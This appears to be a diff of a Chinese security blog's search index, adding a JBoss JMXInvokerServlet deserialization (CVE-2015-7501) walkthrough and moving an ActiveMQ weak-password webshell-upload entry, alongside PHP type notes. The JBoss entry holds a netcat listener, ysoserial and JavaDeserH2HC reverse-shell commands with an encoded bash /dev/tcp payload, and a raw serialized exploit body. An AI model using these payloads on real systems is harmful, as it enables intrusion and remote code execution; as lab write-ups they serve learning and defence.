@@ -164,6 +164,7 @@
 <h3 id="strict-types-指令"><a href="#strict-types-指令" class="headerlink" title="strict_types 指令"></a>strict_types 指令</h3><p>通常情况下，PHP会强制将不合适的数据类型转换为合适的数据类型</p>
 <p>比如，参数需要为<code>string</code>，传入的是<code>int</code>，就会强制转换为<code>string</code>类型</p>
 <p>而<code>strict_types</code>指令则可以开启严格模式，在严格模式下，只能接受完全匹配的类型，否则会抛出异常</p>
+<p>只有一种情况例外，就是当函数期望得到的是一个浮点型数据而提供的是整型时，函数也能正常被调用</p>
 <p>通过内部函数调用函数时，不会受 <code>strict_types</code> 声明影响</p>
 <p><code>strict_types</code>指令的格式为：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -2159,66 +2160,8 @@
       <categories>
         <category>漏洞利用</category>
         <category>服务器应用漏洞</category>
+        <category>常规漏洞</category>
         <category>Atlassian Crowd</category>
-        <category>常规漏洞</category>
-        <category>未授权访问漏洞</category>
-      </categories>
-      <tags>
-        <tag>未授权访问漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache ActiveMQ 未授权访问&amp;弱口令漏洞</title>
-    <url>//209eabddaf61.html</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ActiveMQ 是 Apache 研发的开源消息服务器，它支持Java消息服务、集群、Spring Framework等。</p>
-<p>ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现</p>
-<p>随着中间件的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
-<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver</p>
-<p>其中admin是管理员页面，api是接口，fileserver是储存文件的接口。</p>
-<p>admin和api都需要登录后才能访问，fileserver无需登录</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
-<li>Apache ActiveMQ 全版本</li>
-</ul>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>下载地址：<a href="http://activemq.apache.org/components/classic/download/">http://activemq.apache.org/components/classic/download/</a></p>
-<p>解压文件夹</p>
-<p>启动</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ActiveMQ/bin/ActiveMQ.bat</span><br><span class="line"></span><br><span class="line">cd ActiveMQ/bin/</span><br><span class="line">./ActiveMQ start</span><br></pre></td></tr></table></figure>
-
-<p>访问</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：61616（工作端口），8161（Web端口）</p>
-<p>Apache ActiveMQ 在默认情况下，未做安全配置，没有登录验证，导致可以未授权访问</p>
-<p>存在弱口令账号密码 admin/admin</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过未授权或者弱口令<code>admin/admin</code>登录Apache ActiveMQ</p>
-<p>ActiveMQ默认开启PUT请求，当开启PUT时，访问不存在的目录，Response会返回相应的物理路径信息</p>
-<p>如果存在未授权或默认口令，以下页面同样可以获取到物理路径</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>
-
-<p>在 ActiveMQ 5.12.x~5.13.x 版本中，默认关闭 fileserver 目录，可以在<code>conf/jetty.xml</code>中开启；</p>
-<p>在5.14.0版本以后，彻底删除了fileserver应用</p>
-<p>若服务器存在 fileserver 目录，则可以通过 PUT 请求写入文件</p>
-<p>返回204说明上传成功，返回404或者500说明上传失败</p>
-<p>但 fileserver 下的文件默认不解析，通过MOVE方法请求移动文件</p>
-<p>把文件移动到可以被解析的<code>admin/</code>下或者<code>api/</code>下</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/shell.jsp</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code>为<code>securityConstraint</code>下的<code>authenticate</code>修改值为<code>true</code>，重启服务即可</li>
-<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code> 为<code>securityLoginService</code>下的<code>conf</code>值获取用户properties，修改用户名密码，重启服务即可</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web服务器漏洞</category>
-        <category>Apache</category>
-        <category>常规漏洞</category>
-        <category>ActiveMQ</category>
         <category>未授权访问漏洞</category>
       </categories>
       <tags>
@@ -2270,6 +2213,64 @@
 <h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
 <li>将 Apache ActiveMQ 升级为最新版本</li>
 <li>禁止在 LDAP 配置中使用匿名绑定</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web服务器漏洞</category>
+        <category>Apache</category>
+        <category>常规漏洞</category>
+        <category>ActiveMQ</category>
+        <category>未授权访问漏洞</category>
+      </categories>
+      <tags>
+        <tag>未授权访问漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache ActiveMQ 未授权访问&amp;弱口令漏洞</title>
+    <url>//209eabddaf61.html</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ActiveMQ 是 Apache 研发的开源消息服务器，它支持Java消息服务、集群、Spring Framework等。</p>
+<p>ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现</p>
+<p>随着中间件的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
+<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver</p>
+<p>其中admin是管理员页面，api是接口，fileserver是储存文件的接口。</p>
+<p>admin和api都需要登录后才能访问，fileserver无需登录</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>Apache ActiveMQ 全版本</li>
+</ul>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>下载地址：<a href="http://activemq.apache.org/components/classic/download/">http://activemq.apache.org/components/classic/download/</a></p>
+<p>解压文件夹</p>
+<p>启动</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ActiveMQ/bin/ActiveMQ.bat</span><br><span class="line"></span><br><span class="line">cd ActiveMQ/bin/</span><br><span class="line">./ActiveMQ start</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：61616（工作端口），8161（Web端口）</p>
+<p>Apache ActiveMQ 在默认情况下，未做安全配置，没有登录验证，导致可以未授权访问</p>
+<p>存在弱口令账号密码 admin/admin</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过未授权或者弱口令<code>admin/admin</code>登录Apache ActiveMQ</p>
+<p>ActiveMQ默认开启PUT请求，当开启PUT时，访问不存在的目录，Response会返回相应的物理路径信息</p>
+<p>如果存在未授权或默认口令，以下页面同样可以获取到物理路径</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>
+
+<p>在 ActiveMQ 5.12.x~5.13.x 版本中，默认关闭 fileserver 目录，可以在<code>conf/jetty.xml</code>中开启；</p>
+<p>在5.14.0版本以后，彻底删除了fileserver应用</p>
+<p>若服务器存在 fileserver 目录，则可以通过 PUT 请求写入文件</p>
+<p>返回204说明上传成功，返回404或者500说明上传失败</p>
+<p>但 fileserver 下的文件默认不解析，通过MOVE方法请求移动文件</p>
+<p>把文件移动到可以被解析的<code>admin/</code>下或者<code>api/</code>下</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/shell.jsp</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code>为<code>securityConstraint</code>下的<code>authenticate</code>修改值为<code>true</code>，重启服务即可</li>
+<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code> 为<code>securityLoginService</code>下的<code>conf</code>值获取用户properties，修改用户名密码，重启服务即可</li>
 </ol>
 ]]></content>
       <categories>
@@ -3196,58 +3197,78 @@
 <p>  +1的原码为    0000 0001    = 反码：0000 0001    = 补码：0000 0001</p>
 <p>  -1 的原码为    1000 0001    = 反码： 1111 1110    = 补码：1111 1111</p>
 </blockquote>
-<h2 id="类型声明"><a href="#类型声明" class="headerlink" title="类型声明"></a>类型声明</h2><p>只在PHP 7. 4.0以及之后的版本有效</p>
-<p>类型声明可以用于声明参数的类型</p>
+<h2 id="类型声明"><a href="#类型声明" class="headerlink" title="类型声明"></a>类型声明</h2><p>在 PHP5 中引入的参数类型的声明，如果传参的值不是合法的参数类型</p>
+<p>在 PHP5 中会抛出异常 <code>Fatal error</code></p>
+<p>在 PHP7.4.0 之前不需要特地的声明数据类型，PHP会根据传入的值自动判断</p>
+<p>在 PHP7.4.0 中会抛出异常 <code>TypeError exception</code></p>
+<p>如下为参数可声明的数据类型</p>
 <table>
 <thead>
 <tr>
 <th align="center">类型</th>
 <th align="center">说明</th>
+<th align="center">PHP版本</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">类/接口/名称</td>
-<td align="center">值为指定类和接口的实例化对象</td>
+<td align="center">class/interface name(类，接口的名称)</td>
+<td align="center">参数必须是指定的类或者接口的实例化对象</td>
+<td align="center">PHP 5.0.0</td>
 </tr>
 <tr>
 <td align="center">self</td>
-<td align="center">值必定是所在方法的类的一个</td>
+<td align="center">参数必须是用于类型声明相同类的实例</td>
+<td align="center">PHP 5.0.0</td>
 </tr>
 <tr>
-<td align="center">array</td>
-<td align="center">值必须为array</td>
+<td align="center">parent</td>
+<td align="center">参数必须是用于类型声明父级类的实例</td>
+<td align="center">PHP 5.0.0</td>
 </tr>
 <tr>
-<td align="center">callable</td>
-<td align="center">值必定为一个有效的callable，不能用于类属性的类型声明</td>
+<td align="center">Array</td>
+<td align="center">参数必须为数组类型</td>
+<td align="center">PHP 5.1.0</td>
 </tr>
 <tr>
-<td align="center">bool</td>
-<td align="center">值必须为一个布尔值</td>
+<td align="center">Callable</td>
+<td align="center">参数为有效的回调类型，不能用于类属性的类型声明</td>
+<td align="center">PHP 5.4.0</td>
 </tr>
 <tr>
-<td align="center">float</td>
-<td align="center">值必须为一个浮点数</td>
+<td align="center">Bool</td>
+<td align="center">参数为布尔类型</td>
+<td align="center">PHP 7.0.0</td>
+</tr>
+<tr>
+<td align="center">Float</td>
+<td align="center">参数为浮点型</td>
+<td align="center">PHP 7.0.0</td>
 </tr>
 <tr>
 <td align="center">int</td>
-<td align="center">值必须为一个整型数字</td>
+<td align="center">参数为整形</td>
+<td align="center">PHP 7.0.0</td>
 </tr>
 <tr>
-<td align="center">string</td>
-<td align="center">值必须是字符串</td>
+<td align="center">String</td>
+<td align="center">参数为字符串</td>
+<td align="center">PHP 7.0.0</td>
 </tr>
 <tr>
 <td align="center">iterable</td>
-<td align="center">值必须为array或者instanceof  Traversable，可迭代对象</td>
+<td align="center">参数必须为Array或者指定类或者接口的实例化对象</td>
+<td align="center">PHP 7.1.0</td>
 </tr>
 <tr>
-<td align="center">object</td>
-<td align="center">值必须为对象</td>
+<td align="center">Object</td>
+<td align="center">参数必须为object</td>
+<td align="center">PHP 7.2.0</td>
 </tr>
 <tr>
 <td align="center">mixed</td>
-<td align="center">值可以是任何类型</td>
+<td align="center">参数可以为任何类型</td>
+<td align="center">PHP 8.0.0</td>
 </tr>
 </tbody></table>
 <h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><table>
@@ -3290,6 +3311,22 @@
 
 <p>可以通过settype()函数强制转换数据类型</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$bar</span> = settype(<span class="variable">$for</span>,<span class="string">&#x27;string&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>通常情况下，PHP会强制将不合适的数据类型转换为合适的数据类型</p>
+<p>比如，参数需要为<code>string</code>，传入的是<code>int</code>，就会强制转换为<code>string</code>类型</p>
+<p>而<code>strict_types</code>指令则可以开启严格模式，在严格模式下，只能接受完全匹配的类型，否则会抛出异常</p>
+<p>只有一种情况例外，就是当函数期望得到的是一个浮点型数据而提供的是整型时，函数也能正常被调用</p>
+<p>通过内部函数调用函数时，不会受 <code>strict_types</code> 声明影响</p>
+<p><code>strict_types</code>指令的格式为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>指令只影响指定使用的文件</p>
+<p>必须是文件的第一句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$a</span>, <span class="keyword">int</span> <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(sum(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">// 正常输出</span></span><br><span class="line">var_dump(sum(<span class="number">1.5</span>, <span class="number">2.5</span>));</span><br><span class="line"><span class="comment">// 会抛出异常</span></span><br><span class="line"><span class="comment">// 没有指令的话会强制执行转换为整形，最后结果是3</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
 
 
 
@@ -4631,8 +4668,8 @@
       <categories>
         <category>漏洞利用</category>
         <category>Web应用漏洞</category>
-        <category>Json</category>
         <category>常规漏洞</category>
+        <category>Json</category>
         <category>反序列化漏洞</category>
       </categories>
       <tags>
@@ -4794,7 +4831,7 @@
 <tr>
 <td align="center">mailto</td>
 <td align="center">邮件协议</td>
-<td align="center">url=mailto:<a href="mailto:&#x78;&#120;&#x78;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">&#x78;&#120;&#x78;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;</a>?cc=xxx&amp;body=hello</td>
+<td align="center">url=mailto:<a href="mailto:&#x78;&#x78;&#x78;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#x78;&#x78;&#x78;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;</a>?cc=xxx&amp;body=hello</td>
 </tr>
 <tr>
 <td align="center">netdoc</td>
@@ -5558,6 +5595,240 @@
       </tags>
   </entry>
   <entry>
+    <title>JBoss JMXInvokerServlet 反序列化漏洞 - CVE-2015-7501</title>
+    <url>//7ce29cf4d767.html</url>
+    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>默认端口：8080</p>
+<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss在 <code>/invoker/JMXInvokerServlet</code> 请求中读取了用户传入的对象，然后我们可以利用 <code>Apache Commons Collections</code> 中的 <code>Gadget</code> 执行任意代码。</p>
+<p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：3.2.4~4.0.5</p>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
+<p>在官网下载相应的JBoss版本</p>
+<p>配置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
+
+<p>外网访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
+<ol>
+<li>JBoss漏洞检测工具下载</li>
+</ol>
+<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
+<ol start="2">
+<li>先探测是否具有JBoss服务</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
+
+<p>根据HTTP头部</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问如下地址</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure>
+
+<p>如果提示下载信息，则说明存在此漏洞</p>
+<p>监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p>下载JavaDeserH2HC工具</p>
+<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以使用<code>ysoserial.jar</code>工具</p>
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>
+
+<p>HTTP头部抓包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/JMXInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li><p>删除<code>http-invoker.sar</code>组件</p>
+</li>
+<li><p>设置<code>http-invoker</code></p>
